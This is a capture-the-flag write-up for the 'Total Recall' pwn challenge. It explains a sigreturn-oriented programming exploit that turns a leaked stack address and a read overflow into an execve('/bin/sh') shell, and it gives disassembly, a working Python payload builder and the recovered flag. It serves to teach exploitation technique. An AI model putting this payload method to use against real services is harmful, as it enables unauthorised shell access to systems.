# Total Recall

**Category:** Pwn &nbsp;|&nbsp; **Points:** 431 &nbsp;|&nbsp; **Solves:** 237 &nbsp;|&nbsp; **Flag:** `sun{r3caLl_ev3Ry_reGist3r_sR0p}`

## Challenge description

> Can you recall how to get out of this one?
>
> `nc chal.sunshinectf.games 26003` &nbsp;·&nbsp; file: `total_recall`

## Initial analysis

`total_recall` is tiny: ~100 bytes of code, **statically linked, stripped, not PIE**. It
makes a few raw syscalls and exits — there's no libc to borrow `system`/`/bin/sh` from.

```asm
leak_and_read:
    push rsp
    mov rsi, rsp
    mov rdi, 1
    mov rdx, 8
    mov rax, 1
    syscall                 ; write(1, rsp, 8)  -> leaks a stack address
    pop rax
    lea rsi, [rsp-0x40]
    mov rax, 0
    mov rdx, 0x18
    syscall                 ; read(0, rsp-0x40, 24)   (too small to reach ret)
    ret

big_read:                   ; 0x40104f
    lea rsi, [rsp-0x80]
    mov rdx, 0x400
    mov rax, 0
    syscall                 ; read(0, rsp-0x80, 1024)  <-- overflow
    ret
```

The program **hands us a stack address** (call it `L`), then the second `read` accepts up
to **1024 bytes starting only 0x80 below its saved return address** — so 128 filler bytes
+ 8 bytes overwrite the return address.

Checking `/proc/<pid>/maps` shows the stack is `rw-p`: **NX**, so plain shellcode on the
stack won't execute.

## Core concept — SROP (sigreturn-oriented programming)

With almost no gadgets and a non-executable stack, the move is **SROP**. `rt_sigreturn`
(`rax = 15`) restores the *entire* CPU register set from a frame on the stack. If we put a
**fake** signal frame there, the kernel loads *our* registers.

How to get `rax = 15`? `read()` returns the number of bytes read in `rax`. The binary has
a `syscall` instruction at `0x401014`. So:

- Overflow `big_read`'s return into `0x40104f` (call `big_read` *again*) then `0x401014`
  (the syscall gadget).
- Send exactly **15 bytes** to that second read → `rax = 15` → the `ret` lands on the
  syscall → `rt_sigreturn` fires and restores our fake frame.

Our fake frame sets:

```
rax = 59 (execve)   rdi = &"/bin/sh"   rsi = 0   rdx = 0   rip = 0x401014
```

First trip through `syscall` = `rt_sigreturn` (loads our state); second trip = `execve`.
The stack never needs to be executable.

## Exploitation (see [`solve.py`](./solve.py) / [`solve_remote.py`](./solve_remote.py))

The leaked `L` makes every pointer in the frame computable:

```python
def build_payload(leak):
    frame_addr = leak + 16
    path_addr  = frame_addr + 0x200
    frame = bytearray(0x200)
    regs = {0x68: path_addr, 0x70: 0, 0x88: 0, 0x90: 59,      # rdi, rsi, rdx, rax
            0xa0: frame_addr + 0x200, 0xa8: 0x401014,          # rsp, rip
            0xb0: 0x202, 0xb8: 0x33}                           # eflags, cs
    for off, val in regs.items():
        frame[off:off+8] = struct.pack('<Q', val)
    return (b'A'*0x80
            + struct.pack('<Q', 0x40104f)    # return into big_read again
            + struct.pack('<Q', 0x401014)    # syscall gadget (rt_sigreturn)
            + frame + b'/bin/sh\0')
```

Send the 664-byte overflow, pause, then send exactly 15 bytes for the second `read`
(the pause stops the first `read(1024)` from swallowing both).

## Flag retrieval

`strace` confirms the intended sequence — reads of **24, 664, 15**, then
`rt_sigreturn() = 59`, then `execve("/bin/sh", NULL, NULL)`:

```
$ python3 solve_remote.py           # chal.sunshinectf.games:26003
[+] Stack leak: 0x7fff...
sun{r3caLl_ev3Ry_reGist3r_sR0p}
```

## Key takeaways

- A stack leak + overflow + a single `syscall` gadget is enough for **SROP**, even with no
  libc and an NX stack — you "recall every register" from a fake sigcontext.
- `read()` returning its count in `rax` is a classic way to set `rax = 15` for
  `rt_sigreturn` without a `pop rax` gadget.
- Static + no-PIE means fixed syscall/gadget addresses; the runtime leak supplies the one
  moving piece (the stack address) needed for the frame's pointers.
